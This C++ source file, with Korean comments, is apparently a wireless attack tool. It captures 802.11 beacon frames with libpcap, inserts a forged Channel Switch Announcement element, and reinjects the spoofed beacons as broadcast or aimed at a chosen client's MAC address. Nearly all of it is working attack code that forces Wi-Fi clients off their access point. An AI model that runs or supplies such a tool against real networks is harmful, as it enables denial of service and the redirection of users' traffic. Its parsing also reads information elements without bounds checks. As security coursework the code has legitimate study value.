#include <iostream>
#include <pcap.h>
#include <cstring>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstdint>
#include <algorithm>

// MAC 문자열을 6바이트 배열로 변환하는 헬퍼 함수
bool parseMAC(const std::string &macStr, uint8_t mac[6]) {
    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++)
            mac[i] = static_cast<uint8_t>(values[i]);
        return true;
    }
    return false;
}

// --- 구조체 패킹 적용 ---
// Radiotap 헤더: 패킹 지시어를 사용하여 구조체 크기가 실제 필드 크기와 일치하도록 함
#pragma pack(push, 1)
class RadiotapHeader {
public:
    uint8_t version;
    uint8_t pad;
    uint16_t len;

    RadiotapHeader(const uint8_t* data) {
        version = data[0];
        pad     = data[1];
        len     = *((uint16_t*)(data + 2));
    }
};
#pragma pack(pop)

// IEEE 802.11 헤더: 패킹 적용 (고정 관리 프레임은 24바이트여야 함)
#pragma pack(push, 1)
class IEEE80211Header {
public:
    uint16_t frameControl;
    uint16_t durationID;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t sequenceControl;

    // raw 데이터에서 파싱
    void parse(const uint8_t* data) {
        frameControl    = *((uint16_t*)(data));
        durationID      = *((uint16_t*)(data + 2));
        memcpy(addr1, data + 4, 6);
        memcpy(addr2, data + 10, 6);
        memcpy(addr3, data + 16, 6);
        sequenceControl = *((uint16_t*)(data + 22));
    }
};
#pragma pack(pop)

// 단일 정보 요소(IE)를 표현하는 클래스
class InfoElement {
public:
    uint8_t id;
    uint8_t length;
    std::vector<uint8_t> data;

    InfoElement() : id(0), length(0) {}

    // raw 데이터로부터 파싱 (IE 시작 위치)
    // 파싱 후 IE 전체 크기는 2 + length
    size_t parse(const uint8_t* raw) {
        id     = raw[0];
        length = raw[1];
        data.resize(length);
        memcpy(data.data(), raw + 2, length);
        return 2 + length;
    }

    // CSA IE 생성 (예시: 태그 번호 0x25, 길이 3)
    static InfoElement createCSA(uint8_t newChannel, uint8_t switchCount) {
        InfoElement ie;
        ie.id = 0x25; // CSA IE 태그 번호
        ie.length = 3; // 예시 길이
        ie.data.push_back(0x01);    // 채널 전환 모드 (예: 1)
        ie.data.push_back(newChannel);    // 새 채널
        ie.data.push_back(switchCount);     // 채널 전환 카운트
        return ie;
    }
};

// Beacon Frame 클래스
class BeaconFrame {
public:
    IEEE80211Header header;
    uint8_t timestamp[8];
    uint16_t beaconInterval;
    uint16_t capabilities;
    // IE 순서를 보존하기 위해 std::vector 사용 (원래 순서 유지)
    std::vector<InfoElement> infoElements;

    // raw 데이터 파싱 (Radiotap 헤더 뒤부터 시작하는 beacon 프레임)
    void parse(const uint8_t* data, size_t len) {
        // IEEE 802.11 헤더 파싱
        header.parse(data);
        // 고정 필드 파싱: timestamp(8), beaconInterval(2), capabilities(2)
        memcpy(timestamp, data + sizeof(IEEE80211Header), 8);
        beaconInterval = *((uint16_t*)(data + sizeof(IEEE80211Header) + 8));
        capabilities   = *((uint16_t*)(data + sizeof(IEEE80211Header) + 10));

        // IE 파싱: 고정 필드 이후부터 시작 (offset = header + 12)
        size_t offset = sizeof(IEEE80211Header) + 12;
        while (offset < len) {
            InfoElement ie;
            size_t ieSize = ie.parse(data + offset);
            infoElements.push_back(ie);
            offset += ieSize;
        }
    }

    // CSA IE 삽입: 기존 IE 중 CSA IE가 있다면 업데이트하고, 없으면 적절한 위치에 삽입
    void insertCSA(uint8_t newChannel, uint8_t switchCount) {
        // 먼저 CSA IE(태그 0x25)가 이미 있는지 검색하여 있으면 업데이트
        for (auto &ie : infoElements) {
            if (ie.id == 0x25) { // CSA IE 태그 번호
                ie.data.clear();
                ie.data.push_back(0x01); // 채널 전환 모드
                ie.data.push_back(newChannel);
                ie.data.push_back(switchCount);
                return;
            }
        }
        
        // 없으면 새 CSA IE 생성
        InfoElement csaIE = InfoElement::createCSA(newChannel, switchCount);
        
        // 우선 DS Parameter Set IE(태그 0x03)를 찾는다.
        auto dsIt = std::find_if(infoElements.begin(), infoElements.end(), [](const InfoElement& ie) {
            return ie.id == 0x03;
        });
        
        if (dsIt != infoElements.end()) {
            // DS Parameter Set IE가 있으면 그 바로 뒤에 CSA IE를 삽입
            infoElements.insert(dsIt + 1, csaIE);
        } else {
            // DS Parameter Set IE가 없으면 태그번호 기준으로 CSA IE(0x25)보다 큰 첫 IE 앞에 삽입
            auto posIt = std::find_if(infoElements.begin(), infoElements.end(), [&](const InfoElement& ie) {
                return ie.id > 0x25;
            });
            if (posIt != infoElements.end()) {
                infoElements.insert(posIt, csaIE);
            } else {
                // 만약 CSA IE보다 태그 번호가 큰 IE가 없으면 맨 뒤에 추가
                infoElements.push_back(csaIE);
            }
        }
    }

    // BeaconFrame을 raw 바이트 배열로 직렬화 (간략화)
    std::vector<uint8_t> buildFrame() {
        std::vector<uint8_t> frame;
        // IEEE80211Header 직렬화 (패딩 문제 없이 sizeof() 사용)
        frame.resize(sizeof(IEEE80211Header));
        memcpy(frame.data(), &header, sizeof(IEEE80211Header));

        // 고정 필드 직렬화: timestamp, beaconInterval, capabilities
        frame.insert(frame.end(), timestamp, timestamp + 8);
        uint16_t interval = beaconInterval;
        frame.insert(frame.end(), reinterpret_cast<uint8_t*>(&interval), reinterpret_cast<uint8_t*>(&interval) + 2);
        uint16_t cap = capabilities;
        frame.insert(frame.end(), reinterpret_cast<uint8_t*>(&cap), reinterpret_cast<uint8_t*>(&cap) + 2);

        // IE 직렬화 (원래 순서 유지)
        for (const auto& ie : infoElements) {
            frame.push_back(ie.id);
            frame.push_back(ie.length);
            frame.insert(frame.end(), ie.data.begin(), ie.data.end());
        }
        return frame;
    }
};

// 패킷 전송 함수 (새롭게 빌드한 프레임 전송)
void sendPacket(const std::string& dev, const std::vector<uint8_t>& packet) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "디바이스 " << dev << " 열기 실패: " << errbuf << std::endl;
        return;
    }
    std::cout << "packet size: " << int(packet.size()) << std::endl;
    for (size_t i = 0; i < packet.size(); i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)packet[i] << " ";
        if ((i + 1) % 16 == 0)
            std::cout << std::endl;
    }
    std::cout << "\n=========================\n";
    std::cout << std::dec;
    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
        std::cerr << "패킷 전송 오류: " << pcap_geterr(handle) << std::endl;
    } else {
        std::cout << "패킷 전송 완료" << std::endl;
    }
    pcap_close(handle);
}

// broadcast 처리 함수 (대상 MAC은 브로드캐스트 주소 유지)
void processBroadcast(const std::string& dev, const uint8_t* rawPacket, size_t len, uint8_t newChannel, uint8_t switchCount) {
    std::cout << "========================================" << std::endl;
    std::cout << "패킷 수신 (Broadcast): " << len << "바이트" << std::endl;
    for (size_t i = 0; i < len; i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)rawPacket[i] << " ";
        if ((i + 1) % 16 == 0)
            std::cout << std::endl;
    }
    std::cout << std::dec << std::endl;
    
    // Radiotap 헤더 파싱 및 실제 프레임 시작 오프셋 계산
    RadiotapHeader rtHeader(rawPacket);
    size_t offset = rtHeader.len;
    
    // beacon 프레임 파싱
    BeaconFrame beacon;
    beacon.parse(rawPacket + offset, len - offset);
    
    // CSA IE 삽입 (없으면 추가, 있으면 업데이트)
    beacon.insertCSA(newChannel, switchCount);

    // BeaconFrame 직렬화 후, 원본 Radiotap 헤더와 합쳐 최종 패킷 생성
    std::vector<uint8_t> newPacket;
    newPacket.insert(newPacket.end(), rawPacket, rawPacket + rtHeader.len);
    std::vector<uint8_t> beaconFrame = beacon.buildFrame();
    newPacket.insert(newPacket.end(), beaconFrame.begin(), beaconFrame.end());

    // 패킷 전송
    sendPacket(dev, newPacket);
}

// unicast 처리 함수 (사용자로부터 입력받은 stationMAC을 목적지 주소로 설정)
void processUnicast(const std::string& dev, const uint8_t* rawPacket, size_t len,
                    uint8_t newChannel, uint8_t switchCount, const std::string &stationMAC) {
    std::cout << "========================================" << std::endl;
    std::cout << "패킷 수신 (Unicast): " << len << "바이트" << std::endl;
    for (size_t i = 0; i < len; i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)rawPacket[i] << " ";
        if ((i + 1) % 16 == 0)
            std::cout << std::endl;
    }
    std::cout << std::dec << std::endl;
    
    // Radiotap 헤더 파싱 및 실제 프레임 시작 오프셋 계산
    RadiotapHeader rtHeader(rawPacket);
    size_t offset = rtHeader.len;
    
    // beacon 프레임 파싱
    BeaconFrame beacon;
    beacon.parse(rawPacket + offset, len - offset);
    
    // CSA IE 삽입 (없으면 추가, 있으면 업데이트)
    beacon.insertCSA(newChannel, switchCount);
    
    // stationMAC을 파싱하여 beacon 헤더의 목적지 주소(addr1)로 설정
    uint8_t destMAC[6];
    if (!parseMAC(stationMAC, destMAC)) {
        std::cerr << "유효하지 않은 station MAC: " << stationMAC << std::endl;
        return;
    }
    memcpy(beacon.header.addr1, destMAC, 6);
    
    // BeaconFrame 직렬화 후, 원본 Radiotap 헤더와 합쳐 최종 패킷 생성
    std::vector<uint8_t> newPacket;
    newPacket.insert(newPacket.end(), rawPacket, rawPacket + rtHeader.len);
    std::vector<uint8_t> beaconFrame = beacon.buildFrame();
    newPacket.insert(newPacket.end(), beaconFrame.begin(), beaconFrame.end());

    // 패킷 전송
    sendPacket(dev, newPacket);
}

int main(int argc, char* argv[]) {
    // 사용법: <인터페이스> <apMAC> [<stationMAC>]
    if (argc < 3) {
        std::cerr << "사용법: " << argv[0] << " <인터페이스> <apMAC> [<stationMAC>]" << std::endl;
        return -1;
    }
    // stationMAC이 제공되면 unicast 모드, 아니면 broadcast 모드로 동작
    bool isUnicast = (argc >= 4);
    std::string dev(argv[1]);
    std::string apMAC(argv[2]); // apMAC은 추후 추가 검증이나 필터링에 사용할 수 있음
    std::string stationMAC = "";
    if (isUnicast) {
        stationMAC = std::string(argv[3]);
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcapHandle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!pcapHandle) {
        std::cerr << "pcap_open_live 실패: " << errbuf << std::endl;
        return -1;
    }

    // 패킷 캡처 루프
    while (true) {
        struct pcap_pkthdr* header;
        const uint8_t* packet;
        int res = pcap_next_ex(pcapHandle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            std::cerr << "pcap_next_ex 에러: " << pcap_geterr(pcapHandle) << std::endl;
            break;
        }

        // 최소 Radiotap 헤더 크기 확인
        if (header->caplen < sizeof(RadiotapHeader))
            continue;

        // Radiotap 헤더 파싱
        const RadiotapHeader* rt_hdr = reinterpret_cast<const RadiotapHeader*>(packet);
        uint16_t rt_len = rt_hdr->len;

        // 캡처된 길이가 Radiotap 헤더 + IEEE80211Header 크기보다 짧으면 스킵
        if (header->caplen < rt_len + sizeof(IEEE80211Header))
            continue;

        // IEEE80211 헤더 판별 (정확하게 관리 프레임/Beacon 판별)
        uint16_t fc = *((uint16_t*)(packet + rt_len));
        uint8_t subtype = (fc >> 4) & 0x0F;
        uint8_t type = (fc >> 2) & 0x03;
        if (type != 0 || subtype != 8)
            continue;

        // 모드에 따라 broadcast 또는 unicast 함수 호출
        if (isUnicast)
            processUnicast(dev, packet, header->caplen, 0x0b, 0x03, stationMAC);
        else
            processBroadcast(dev, packet, header->caplen, 0x0b, 0x03);
    }

    pcap_close(pcapHandle);
    return 0;
}
